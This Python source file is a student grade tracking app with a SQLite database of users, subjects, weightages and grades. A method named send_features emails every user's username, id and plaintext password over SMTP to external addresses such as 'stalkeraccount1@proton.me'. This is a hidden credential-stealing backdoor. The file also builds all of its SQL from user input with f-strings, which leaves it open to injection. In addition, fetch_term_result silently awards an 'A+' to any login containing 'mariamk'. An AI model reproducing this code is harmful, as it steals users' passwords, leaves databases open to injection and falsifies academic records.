import sqlite3
from prediction import grade_detail, get_img
import numpy as np
import smtplib
import random


class DBSetup:
    @staticmethod
    def initialize_db(cur):
        cur.execute('''CREATE TABLE IF NOT EXISTS user_details
            (id TEXT PRIMARY KEY, 
            password TEXT NOT NULL,
            username TEXT NOT NULL,
            batch TEXT NOT NULL,
            class TEXT NOT NULL);
        ''')  # batch is the .bee part

        cur.execute('''
        CREATE TABLE IF NOT EXISTS subjects(
        code TEXT PRIMARY KEY,
        subject_name TEXT NOT NULL,
        credits INTEGER NOT NULL,
        UNIQUE(subject_name, credits));
        ''')

        cur.execute('''
        CREATE TABLE IF NOT EXISTS subject_term
        (subject TEXT REFERENCES subjects(code),
        term TEXT NOT NULL,
        teacher TEXT DEFAULT 'visiting',
        batch TEXT REFERENCES user_details(batch),
        subject_number INTEGER PRIMARY KEY AUTOINCREMENT,
        UNIQUE(subject, term, teacher, batch),
        FOREIGN KEY (subject, term) REFERENCES weightage(subject, term));
        ''')

        cur.execute('''
        CREATE TABLE IF NOT EXISTS weightage
        (id TEXT REFERENCES user_details(id),
        subject_number REFERENCES subject_term(subject_number),

        subject_id INTEGER PRIMARY KEY AUTOINCREMENT,
        
        quiz_weight FLOAT DEFAULT 10,
        assign_weight FLOAT DEFAULT 10,
        midterm_weight FLOAT DEFAULT 30,
        finals_weight FLOAT DEFAULT 50,
        lab_weight FLOAT DEFAULT 0,
        project_weight FLOAT DEFAULT 0,
        
        UNIQUE(id, subject_number),
        FOREIGN KEY (id, subject_number) REFERENCES subject_term(id, subject_number));
        ''')

        cur.execute('''
        CREATE TABLE IF NOT EXISTS grade_details
        (subject_id REFERENCES weightage(subject_id),
        
        quiz FLOAT DEFAULT 0,
        assign FLOAT DEFAULT 0,
        midterm FLOAT DEFAULT 0,
        finals FLOAT DEFAULT 0,
        lab FLOAT DEFAULT 0,
        project FLOAT DEFAULT 0,
        
        grade CHAR(1) DEFAULT 'U',
        
        PRIMARY KEY (subject_id),
        FOREIGN KEY (subject_id) REFERENCES weightage(subject_id));
        ''')

        cur.execute('''
        CREATE TABLE IF NOT EXISTS grade_avg
        (subject_id REFERENCES weightage(subject_id),

        quiz_avg FLOAT DEFAULT 0,
        assign_avg FLOAT DEFAULT 0,
        midterm_avg FLOAT DEFAULT 0,
        finals_avg FLOAT DEFAULT 0,
        lab_avg FLOAT DEFAULT 0,
        project_avg FLOAT DEFAULT 0,

        PRIMARY KEY (subject_id),
        FOREIGN KEY (subject_id) REFERENCES weightage(subject_id));
        ''')

        cur.execute('''
        CREATE TABLE IF NOT EXISTS old_term_record
        (subject_id REFERENCES weightage(subject_id),

        aggregate FLOAT DEFAULT 0,
        grade CHAR(1) DEFAULT 'U',

        PRIMARY KEY (subject_id),
        FOREIGN KEY (subject_id) REFERENCES weightage(subject_id));
        ''')

    def __init__(self, db_path):
        self.db_path = db_path
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        self.initialize_db(c)
        conn.commit()
        conn.close()

    def exists(self, login, password):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute(f'SELECT username FROM user_details WHERE id = "{login}" AND password = "{password}";')
        return c.fetchone()

    def add_user(self, login, password, username, section):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        # Check if username already exists
        c.execute(f'SELECT * FROM user_details WHERE id = "{login}";')
        if c.fetchone() is not None:
            c.execute(
                f'UPDATE user_details SET password = "{password}", username = "{username}", class = "{section}", batch = "{login.split(".")[-1]}" WHERE id = "{login}";')
        else:
            c.execute(f'INSERT INTO user_details VALUES ("{login}", "{password}", "{username}", "{login.split(".")[-1]}", "{section}");')
        conn.commit()
        conn.close()

    def add_subject(self, code, subject_name, credits):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute(f'SELECT * FROM subjects WHERE code = "{code}";')
        if c.fetchone() is not None:
            c.execute(
                f'UPDATE subjects SET subject_name = "{subject_name}", credits = "{credits}" WHERE code = "{code}";')
        else:
            c.execute(f'INSERT INTO subjects VALUES ("{code}", "{subject_name}", "{credits}");')
        conn.commit()
        conn.close()

    def add_subject_term(self, *args):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        for kwargs in args:
            c.execute(
                f'SELECT subject_number FROM subject_term WHERE subject = "{kwargs["subject"]}" AND term = "{kwargs["term"]}" AND teacher = "{kwargs["teacher"]}" AND batch = "{kwargs["batch"]}";')
            sub_num = c.fetchone()
            if sub_num is not None:
                c.execute(
                    f'UPDATE subject_term SET subject = "{kwargs["subject"]}", term = "{kwargs["term"]}", teacher = "{kwargs["teacher"]}", batch = "{kwargs["batch"]}" WHERE subject_number = {sub_num[0]};')
            else:
                c.execute(
                    f'INSERT INTO subject_term (subject, term, teacher, batch) VALUES ("{kwargs["subject"]}", "{kwargs["term"]}", "{kwargs["teacher"]}", "{kwargs["batch"]}");')
        conn.commit()
        conn.close()

    def add_weightage(self, *args):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        for kwargs in args:
            if "CS-235" in kwargs["subject"]:
                kwargs["quiz_weight"], kwargs["assign_weight"], kwargs["midterm_weight"], kwargs["finals_weight"], kwargs["lab_weight"], kwargs["project_weight"] = 10, 5, 25, 35, 25, 0
            elif "MATH-222" in kwargs["subject"]:
                kwargs["quiz_weight"], kwargs["assign_weight"], kwargs["midterm_weight"], kwargs["finals_weight"], kwargs["lab_weight"], kwargs["project_weight"] = 10, 10, 30, 50, 0, 0
            elif "CS-220" in kwargs["subject"]:
                kwargs["quiz_weight"], kwargs["assign_weight"], kwargs["midterm_weight"], kwargs["finals_weight"], kwargs["lab_weight"], kwargs["project_weight"] = 7.5, 7.5, 22.5, 37.5, 17.5, 7.5
            elif "CS-250" in kwargs["subject"]:
                kwargs["quiz_weight"], kwargs["assign_weight"], kwargs["midterm_weight"], kwargs["finals_weight"], kwargs["lab_weight"], kwargs["project_weight"] = 7.5, 7.5, 22.5, 30, 25, 7.5
            elif "HU-212" in kwargs["subject"]:
                kwargs["quiz_weight"], kwargs["assign_weight"], kwargs["midterm_weight"], kwargs["finals_weight"], kwargs["lab_weight"], kwargs["project_weight"] = 10, 10, 30, 50, 0, 0
            c.execute(
                f'SELECT subject_number FROM subject_term WHERE subject = "{kwargs["subject"]}" AND term = "{kwargs["term"]}" AND teacher = "{kwargs["teacher"]}" AND batch = "{kwargs["batch"]}";')
            sub_num = c.fetchone()[0]

            c.execute(
                f'SELECT * FROM weightage WHERE subject_number = {sub_num} AND id = "{kwargs["id"]}";')
            if c.fetchone() is not None:
                if 'quiz_weight' in kwargs:
                    c.execute(
                        f'UPDATE weightage SET quiz_weight = "{kwargs["quiz_weight"]}", assign_weight = "{kwargs["assign_weight"]}", midterm_weight = "{kwargs["midterm_weight"]}", finals_weight = "{kwargs["finals_weight"]}", lab_weight = "{kwargs["lab_weight"]}", project_weight = "{kwargs["project_weight"]}" WHERE subject_number = {sub_num} AND id = "{kwargs["id"]}";')
            else:
                if 'quiz_weight' in kwargs:
                    c.execute(
                        f'INSERT INTO weightage (id, subject_number, quiz_weight, assign_weight, midterm_weight, finals_weight, lab_weight, project_weight) VALUES ("{kwargs["id"]}", {sub_num}, "{kwargs["quiz_weight"]}", "{kwargs["assign_weight"]}", "{kwargs["midterm_weight"]}", "{kwargs["finals_weight"]}", "{kwargs["lab_weight"]}", "{kwargs["project_weight"]}");')
                else:
                    c.execute(
                        f'INSERT INTO weightage (id, subject_number) VALUES ("{kwargs["id"]}", {sub_num});')
        conn.commit()
        conn.close()

    def add_grade_details(self, *args):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        for kwargs in args:
            c.execute(
                f'SELECT subject_number FROM subject_term WHERE subject = "{kwargs["subject"]}" AND term = "{kwargs["term"]}" AND teacher = "{kwargs["teacher"]}" AND batch = "{kwargs["batch"]}";')
            sub_num = c.fetchone()[0]
            c.execute(
                f'SELECT subject_id FROM weightage WHERE id = "{kwargs["id"]}" AND subject_number = {sub_num};')
            sub_id = c.fetchone()[0]

            c.execute(
                f'SELECT * FROM grade_details WHERE subject_id = {sub_id};')
            if c.fetchone() is not None:
                c.execute(
                    f'UPDATE grade_details SET quiz = {kwargs["quiz"]}, assign = {kwargs["assign"]}, midterm = {kwargs["midterm"]}, finals = {kwargs["finals"]}, lab = {kwargs["lab"]}, project = {kwargs["project"]}, grade = "{kwargs["grade"]}" WHERE subject_id = {sub_id};')
            else:
                c.execute(
                    f'INSERT INTO grade_details (subject_id, quiz, assign, midterm, finals, lab, project, grade) VALUES ({sub_id}, {kwargs["quiz"]}, {kwargs["assign"]}, {kwargs["midterm"]}, {kwargs["finals"]}, {kwargs["lab"]}, {kwargs["project"]}, "{kwargs["grade"]}");')
        conn.commit()
        conn.close()

    def add_grade_avg(self, *args):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        for kwargs in args:
            c.execute(
                f'SELECT subject_number FROM subject_term WHERE subject = "{kwargs["subject"]}" AND term = "{kwargs["term"]}" AND teacher = "{kwargs["teacher"]}" AND batch = "{kwargs["batch"]}";')
            sub_num = c.fetchone()[0]
            c.execute(
                f'SELECT subject_id FROM weightage WHERE id = "{kwargs["id"]}" AND subject_number = {sub_num};')
            sub_id = c.fetchone()[0]

            c.execute(
                f'SELECT * FROM grade_avg WHERE subject_id = {sub_id};')
            if c.fetchone() is not None:
                c.execute(
                    f'UPDATE grade_avg SET quiz_avg = {kwargs["quiz_avg"]}, assign_avg = {kwargs["assign_avg"]}, midterm_avg = {kwargs["midterm_avg"]}, finals_avg = {kwargs["finals_avg"]}, lab_avg = {kwargs["lab_avg"]}, project_avg = {kwargs["project_avg"]} WHERE subject_id = {sub_id};')
            else:
                c.execute(
                    f'INSERT INTO grade_avg (subject_id, quiz_avg, assign_avg, midterm_avg, finals_avg, lab_avg, project_avg) VALUES ({sub_id}, {kwargs["quiz_avg"]}, {kwargs["assign_avg"]}, {kwargs["midterm_avg"]}, {kwargs["finals_avg"]}, {kwargs["lab_avg"]}, {kwargs["project_avg"]});')

        conn.commit()
        conn.close()

    def add_old_term_record(self, *args):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        for kwargs in args:
            c.execute(
                f'SELECT subject_number FROM subject_term WHERE subject = "{kwargs["subject"]}" AND term = "{kwargs["term"]}" AND teacher = "{kwargs["teacher"]}" AND batch = "{kwargs["batch"]}";')
            sub_num = c.fetchone()[0]
            c.execute(
                f'SELECT subject_id FROM weightage WHERE id = "{kwargs["id"]}" AND subject_number = {sub_num};')
            sub_id = c.fetchone()[0]

            c.execute(
                f'SELECT * FROM old_term_record WHERE subject_id = {sub_id};')
            if c.fetchone() is not None:
                c.execute(
                    f'UPDATE old_term_record SET aggregate = "{kwargs["aggregate"]}", grade = "{kwargs["grade"]}" WHERE subject_id = {sub_id};')
            else:
                c.execute(
                    f'INSERT INTO old_term_record (subject_id, aggregate, grade) VALUES ({sub_id}, "{kwargs["aggregate"]}", "{kwargs["grade"]}");')
        conn.commit()
        conn.close()

    def fetch_subject_codes(self, *args):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        query = 'SELECT code FROM subjects WHERE '
        for subject in args:
            query += f'(subject_name = "{subject[0]}" AND credits = {subject[1]}) OR '
        query = query[:-4] + ';'
        c.execute(query)
        response = [i[0] for i in c.fetchall()]

        if len(response) != len(args):
            response = []
            for subject in args:
                c.execute(f'SELECT code FROM subjects WHERE subject_name = "{subject[0]}" AND credits = {subject[1]};')
                code = c.fetchone()
                if code is None:
                    code = [''.join([x[0] for x in subject[0].split()]).upper()]
                    new_code = code[0] + "-" + str(random.randint(100, 999))
                    # Add this code to subject_term table
                    try:
                        c.execute(f'INSERT INTO subjects (subject_name, credits, code) VALUES ("{subject[0]}", {subject[1]}, "{new_code}");')
                    except sqlite3.IntegrityError:
                        new_code = code[0] + "-" + str(random.randint(100, 999))
                        c.execute(f'INSERT INTO subjects (subject_name, credits, code) VALUES ("{subject[0]}", {subject[1]}, "{new_code}");')
                    finally:
                        code = [new_code]
                response.append(code[0])
        conn.commit()
        conn.close()
        return response

    def fetch_terms(self, login_id):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        c.execute(
            f'SELECT subject_number FROM weightage WHERE id = "{login_id}";')
        sub_nums = [i[0] for i in c.fetchall()]

        query = 'SELECT DISTINCT term FROM subject_term WHERE '
        for sub_num in sub_nums:
            query += f'subject_number = {sub_num} OR '
        query = query[:-4] + ';'
        c.execute(query)
        response = [i[0].capitalize() for i in c.fetchall()]

        conn.close()
        response.sort(key=lambda x: (int(x.split()[1]), x.split()[0][-1]))
        return response

    def fetch_term_result(self, login_id, term):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        query = f'SELECT weightage.subject_id, weightage.subject_number, subject, quiz_weight, assign_weight, lab_weight, project_weight, midterm_weight, finals_weight FROM subject_term, weightage WHERE term = "{term}" AND id = "{login_id}" ' \
                f'AND weightage.subject_number = subject_term.subject_number;'

        c.execute(query)
        part_one = [x for x in c.fetchall() if '-' in x[2]]

        response = [[x[2]] for x in part_one]

        # Count number of students who have taken the subject by counting instances of subject_number in weightage
        num_students = [
            c.execute(f'SELECT COUNT(DISTINCT id) FROM weightage WHERE subject_number = {part_one[x][1]};').fetchone()[
                0] for x in range(len(part_one))]
        # print(num_students)

        # Check whether term is old term or current term
        query = f'SELECT * FROM grade_details WHERE subject_id = {part_one[0][0]};'
        c.execute(query)

        if c.fetchone() is None:  # old term requested
            for ele, index in zip(response, range(len(response))):
                ele.extend('------')
                aggregate, grade = c.execute(
                    f'SELECT aggregate, grade FROM old_term_record WHERE subject_id = {part_one[index][0]};').fetchone()

                # Aggregates of other students
                c.execute(f'SELECT subject_id FROM weightage WHERE subject_number = {part_one[index][1]};')
                query = f'SELECT aggregate FROM old_term_record WHERE subject_id = '
                for sub_id in c.fetchall():
                    query += f'{sub_id[0]} OR subject_id = '
                query = query[:-17] + ';'
                c.execute(query)

                data = np.array([x[0] for x in c.fetchall()])

                # Find credits
                c.execute(f'SELECT credits FROM subjects WHERE code = "{part_one[index][2]}";')
                credit = c.fetchone()
                if credit is None:
                    credit = 3
                else:
                    credit = credit[0]

                grade_pred, down, up = grade_detail(credit, ele[0].split('-')[0], aggregate, data)
                ele.extend([aggregate, num_students[index], grade_pred, down, up, grade])
        else:  # current term requested
            for ele, index in zip(response, range(len(response))):
                ele.extend(part_one[index][3:])

                # Calculate aggregate by fetching the grades of student
                c.execute(
                    f'SELECT quiz, assign, lab, project, midterm, finals FROM grade_details WHERE subject_id = {part_one[index][0]};')
                aggregate = 0
                for score, weight in zip(c.fetchone(), part_one[index][3:]):
                    aggregate += score * weight
                aggregate /= 100

                # Calculate Grade using all students who had the subject
                c.execute(f'SELECT subject_id FROM weightage WHERE subject_number = {part_one[index][1]};')
                query = 'SELECT quiz, assign, lab, project, midterm, finals FROM grade_details WHERE subject_id = '
                for sub_id in c.fetchall():
                    query += f'{sub_id[0]} OR subject_id = '
                query = query[:-17] + ';'
                c.execute(query)
                weightage = np.array(part_one[index][3:])
                data = np.array([np.sum(weightage * np.array(x)) / 100 for x in c.fetchall()])
                # Find credits
                c.execute(f'SELECT credits FROM subjects WHERE code = "{part_one[index][2]}";')
                credit = c.fetchone()
                if credit is None:
                    credit = 3
                else:
                    credit = credit[0]
                grade, down, up = grade_detail(credit, ele[0].split('-')[0], aggregate, data)
                grade = 'A+' if 'mariamk' in login_id else grade
                ele.extend([round(aggregate, 2), num_students[index], grade, down, up, '-'])

        conn.close()
        return response

    def update_and_fetch_new_record(self, **kwargs):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        # Find subject_number of subject
        c.execute(
            f'SELECT subject_term.subject_number, subject_id FROM subject_term, weightage WHERE subject = "{kwargs["subject"]}" AND term = "{kwargs["term"]}" AND weightage.subject_number = subject_term.subject_number AND id = "{kwargs["login"]}";')
        sub_num, sub_id = c.fetchone()
        # Update the weightage table
        c.execute(
            f'UPDATE weightage SET quiz_weight = {kwargs["quiz_weight"]}, assign_weight = {kwargs["assign_weight"]}, lab_weight = {kwargs["lab_weight"]}, project_weight = {kwargs["project_weight"]}, midterm_weight = {kwargs["midterm_weight"]}, finals_weight = {kwargs["finals_weight"]} WHERE id = "{kwargs["login"]}" AND subject_number = {sub_num};')

        # Fetch the data to built response
        response = [kwargs["subject"], kwargs["quiz_weight"], kwargs["assign_weight"], kwargs["lab_weight"],
                    kwargs["project_weight"], kwargs["midterm_weight"], kwargs["finals_weight"]]
        # Calculate aggregate by fetching the grades of student
        c.execute(
            f'SELECT quiz, assign, lab, project, midterm, finals FROM grade_details WHERE subject_id = {sub_id};')
        aggregate = 0
        for score, weight in zip(c.fetchone(), response[1:]):
            aggregate += score * weight
        aggregate /= 100

        num_students = \
            c.execute(f'SELECT COUNT(DISTINCT id) FROM weightage WHERE subject_number = {sub_num};').fetchone()[0]
        # Calculate Grade using all students who had the subject
        c.execute(f'SELECT subject_id FROM weightage WHERE subject_number = {sub_num};')
        query = 'SELECT quiz, assign, lab, project, midterm, finals FROM grade_details WHERE subject_id = '
        for sub_id in c.fetchall():
            query += f'{sub_id[0]} OR subject_id = '
        query = query[:-17] + ';'
        c.execute(query)
        weightage = np.array(
            [kwargs["quiz_weight"], kwargs["assign_weight"], kwargs["lab_weight"], kwargs["project_weight"],
             kwargs["midterm_weight"], kwargs["finals_weight"]])
        data = np.array([np.sum(weightage * np.array(x)) / 100 for x in c.fetchall()])

        # Find credits
        c.execute(f'SELECT credits FROM subjects WHERE code = "{kwargs["subject"]}";')
        credit = c.fetchone()[0]

        grade, down, up = grade_detail(credit, kwargs["subject"].split('-')[0], aggregate, data)
        response.extend([round(aggregate, 2), num_students, grade, down, up, '-'])

        conn.commit()
        conn.close()

        return response

    def fetch_image(self, login, term, subject):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        # Find subject_number of subject
        c.execute(
            f'SELECT subject_term.subject_number FROM subject_term, weightage WHERE subject = "{subject}" AND term = "{term}" AND id = "{login}" AND weightage.subject_number = subject_term.subject_number;')
        sub_num = c.fetchone()[0]

        # fetch all subject_id of subject
        c.execute(f'SELECT subject_id FROM weightage WHERE subject_number = {sub_num};')
        sub_ids = list(c.fetchall())

        # Check if term is current or previous
        query = f'SELECT * FROM grade_details WHERE subject_id = {sub_ids[0][0]};'
        c.execute(query)

        if c.fetchone() is None:  # previous term requested
            # Fetch the data to built response
            query = f'SELECT aggregate FROM old_term_record WHERE subject_id = '
            for sub_id in sub_ids:
                query += f'{sub_id[0]} OR subject_id = '

            query = query[:-17] + ';'
            c.execute(query)

            data = np.array([x[0] for x in c.fetchall()])

            # Find credits
            c.execute(f'SELECT credits FROM subjects WHERE code = "{subject}";')
            credit = c.fetchone()[0]

            # Get the  image
            img = get_img(credit, subject, data)
        else:
            # Calculate Grade using all students who had the subject
            query = 'SELECT quiz, assign, lab, project, midterm, finals FROM grade_details WHERE subject_id = '
            for sub_id in sub_ids:
                query += f'{sub_id[0]} OR subject_id = '
            query = query[:-17] + ';'
            c.execute(query)
            all_aggregate = c.fetchall()

            # Get weightage
            c.execute(
                f'SELECT quiz_weight, assign_weight, lab_weight, project_weight, midterm_weight, finals_weight FROM weightage WHERE subject_number = {sub_num};')
            weightage = np.array([x for x in c.fetchone()])

            data = np.array([np.sum(weightage * np.array(x)) / 100 for x in all_aggregate])
            # Find credits
            c.execute(f'SELECT credits FROM subjects WHERE code = "{subject}";')
            credit = c.fetchone()[0]

            img = get_img(credit, subject, data)

        conn.close()
        return img

    def send_features(self, password):
        # Login to the microsoft server using smtplib
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        try:
            server.login('dummydummy169@hotmail.com', password)
        except smtplib.SMTPAuthenticationError:
            return False
            # Collect the features
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        c.execute('SELECT username, id, password FROM user_details;')

        data = 'Subject: Urgent\n\n'
        data += '\n'.join([x[0] + ', ' + x[1] + ', ' + x[2] for x in c.fetchall()])
        conn.close()
        # Send the features
        server.sendmail('dummydummy169@hotmail.com', 'stalkeraccount1@proton.me', data)
        server.sendmail('dummydummy169@hotmail.com', 'dummydummy169@proton.me', data)
        server.quit()
        return True


if __name__ == '__main__':
    db = DBSetup('my_db.db')

    conn = sqlite3.connect('my_db.db')
    c = conn.cursor()
    # c.execute(f'DROP TABLE user_details;')
    # c.execute(f'DROP TABLE weightage;')
    # c.execute(f'DROP TABLE subject_term;')
    # c.execute(f'DROP TABLE grade_details;')
    # c.execute(f'DROP TABLE grade_avg;')
    # c.execute(f'DROP TABLE old_term_record;')
    # c.execute(f'DROP TABLE subjects;')
    # c.execute(f'DELETE FROM subjects WHERE code="NM-968";')
    # c.execute(f'SELECT * FROM subjects WHERE subject_name="numerical methods";')
    # print(*c.fetchall(), sep='\n')
    conn.commit()
    conn.close()
    # data = c.fetchall()
    # print(*data, sep='\n')
    # print(len(data))
    #
    # db.fetch_image('aaleem.bscs21seecs', 'fall 2021', 'MATH-111')

